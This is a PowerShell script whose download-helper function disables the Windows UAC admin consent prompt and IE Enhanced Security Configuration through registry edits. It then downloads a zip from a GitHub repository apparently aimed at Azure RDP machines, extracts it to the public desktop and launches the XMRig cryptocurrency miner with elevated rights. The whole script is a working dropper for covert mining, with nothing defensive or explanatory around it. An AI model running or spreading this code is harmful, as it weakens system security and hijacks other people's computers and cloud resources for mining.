function Get-Webfile ($url)
{   		
    $AdminKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}"
    $UserKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}"
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000
    Set-ItemProperty -Path $AdminKey -Name "IsInstalled" -Value 0
    Set-ItemProperty -Path $UserKey -Name "IsInstalled" -Value 0
    Write-Host "IE-UAC has been disabled." -ForegroundColor Green
    $dest=(Join-Path $pwd.Path $url.SubString($url.LastIndexOf('/')))
    Write-Host "Downloading $url`n" -ForegroundColor Green;
    $uri=New-Object "System.Uri" "$url"
    $request=[System.Net.HttpWebRequest]::Create($uri)
    $request.set_Timeout(5000)
    $response=$request.GetResponse()
    $totalLength=[System.Math]::Floor($response.get_ContentLength()/1024)
    $length=$response.get_ContentLength()
    $responseStream=$response.GetResponseStream()
    $destStream=New-Object -TypeName System.IO.FileStream -ArgumentList $dest, Create
    $buffer=New-Object byte[] 10KB
    $count=$responseStream.Read($buffer,0,$buffer.length)
    $downloadedBytes=$count
    while ($count -gt 0)
        {
        [System.Console]::CursorLeft=0
        [System.Console]::Write("Downloaded {0}K of {1}K ({2}%)", [System.Math]::Floor($downloadedBytes/1024), $totalLength, [System.Math]::Round(($downloadedBytes / $length) * 100,0))
        $destStream.Write($buffer, 0, $count)
        $count=$responseStream.Read($buffer,0,$buffer.length)
        $downloadedBytes+=$count
        }
    Write-Host ""
    Write-Host "`nDownload of `"$dest`" finished." -ForegroundColor Green;
    $destStream.Flush()
    $destStream.Close()
    $destStream.Dispose()
    $responseStream.Dispose()
    Add-Type -assembly "system.io.compression.filesystem"
    [io.compression.zipfile]::ExtractToDirectory($dest, "C:\Users\Public\Desktop")
    cd C:\Users\Public\Desktop
    Start-Process -FilePath "xmrig.exe" -Verb RunAs

}
Get-Webfile ("https://raw.githubusercontent.com/ngoc7sao9/Azure_RDP_NoNgrok/main/xmrigwin.zip")
